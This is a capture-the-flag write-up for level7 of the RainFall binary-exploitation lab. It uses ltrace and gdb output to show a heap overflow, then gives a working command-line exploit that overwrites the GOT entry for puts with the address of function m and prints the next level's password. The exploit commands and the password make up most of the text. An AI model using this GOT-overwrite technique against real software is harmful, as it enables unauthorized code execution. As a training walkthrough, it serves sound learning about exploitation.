Here, we need to call the function `m` to print the content of `.pass`.

With a ltrace with, we got :

>level7@RainFall:~$ ltrace ./level7 `python -c 'print "A" * 100'` yo
>__libc_start_main(0x8048521, 3, 0xbffff684, 0x8048610, 0x8048680 <unfinished ...>
>malloc(8)                                                                                                  = 0x0804a008
>malloc(8)                                                                                                  = 0x0804a018
>malloc(8)                                                                                                  = 0x0804a028
>malloc(8)                                                                                                  = 0x0804a038
>strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                  = 0x0804a018
>strcpy(0x41414141, "yo" <unfinished ...>
>--- SIGSEGV (Segmentation fault) ---
>+++ killed by SIGSEGV +++

There is a segfault because we try to copy the second argument in a strange address.
The `strange address` correspond to the bytes 21-24 of the first argument.

So, if we do the same thing as previously, and put inside a function that will be called later (`puts` for example) the address of `m`. it will call `m` for us.
So we gather the address of `m` with gdb :

```assembly
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.

```

And we find where to put this new found address :

```assembly
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

```



>level7@RainFall:~$ ./level7 `python -c 'print "AAAA" * 5 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
>5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
>1607353581

```bash
su leve8
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

